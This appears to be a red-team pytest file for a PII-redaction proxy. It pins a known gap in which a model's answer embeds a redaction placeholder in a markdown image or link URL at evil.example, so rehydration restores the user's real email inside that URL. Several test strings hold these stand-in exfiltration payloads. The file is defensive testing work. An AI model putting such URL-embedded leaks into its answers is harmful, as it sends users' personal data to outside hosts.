"""Red-team: rehydration exfiltration (T79).

A curious model answers with the placeholder inside a URL it chose:
``![x](https://evil.example/?q=[PII_EMAIL_1])``. Local restore swaps the
placeholder for the real value -- inside the URL. What the code does today:
it restores, unconditionally. The console renderer never makes links
clickable (PARTIAL mitigation, pinned below), but API answers carry a live
URL with the real value to any client that renders or follows links.
"""

from __future__ import annotations

import pytest

from shadowfenced import redact
from shadowfenced.app import SendRequest, send
from helpers_rt import ROOT, email, upstream_mock


@pytest.fixture()
def mock_upstream():
    yield from upstream_mock()


@pytest.mark.xfail(
    strict=True,
    reason="KNOWN GAP: rehydrate restores placeholders inside URLs",
)
def test_placeholder_in_image_url_not_restored():
    """A placeholder inside a markdown image URL must stay a placeholder."""
    answer = "done ![x](https://evil.example/?q=[PII_EMAIL_1])"
    restored, _, _ = redact.rehydrate(answer, {"[PII_EMAIL_1]": email()})
    assert email() not in restored


@pytest.mark.xfail(
    strict=True,
    reason="KNOWN GAP: rehydrate restores placeholders inside URLs",
)
def test_placeholder_in_link_url_not_restored():
    """A placeholder inside a markdown link URL must stay a placeholder."""
    answer = "click [here](https://evil.example/collect/[PII_EMAIL_1])"
    restored, _, _ = redact.rehydrate(answer, {"[PII_EMAIL_1]": email()})
    assert email() not in restored


@pytest.mark.xfail(
    strict=True,
    reason="KNOWN GAP: rehydrate restores placeholders inside URLs",
)
def test_evil_image_url_end_to_end(mock_upstream):
    """End to end: a hostile upstream answer must not come back weaponized."""
    mock_upstream(answer="done ![x](https://evil.example/?q=[PII_EMAIL_1])")
    body = send(SendRequest(messages=[{
        "role": "user", "content": f"write to {email()} about the rota",
    }]))
    assert body["decision"] == "REDACT"
    assert email() not in (body["answer"] or "")


def test_plain_placeholder_still_restores_control():
    """Control: normal restore in prose keeps working."""
    restored, marks, unmatched = redact.rehydrate(
        "wrote to [PII_EMAIL_1] today", {"[PII_EMAIL_1]": email()})
    assert restored == f"wrote to {email()} today"
    assert len(marks) == 1
    assert unmatched == []


def test_console_renderer_makes_no_links():
    """PARTIAL mitigation: the console answer renderer has no link output."""
    js = (ROOT / "src" / "shadowfenced" / "static" / "app.js").read_text(
        encoding="utf-8")
    start = js.find("function renderInlineMarkdown")
    end = js.find("function renderAnswer")
    assert start >= 0 and end > start
    renderer = js[start:end]
    assert "<a" not in renderer
    assert "href" not in renderer
    assert "http" not in renderer.lower()
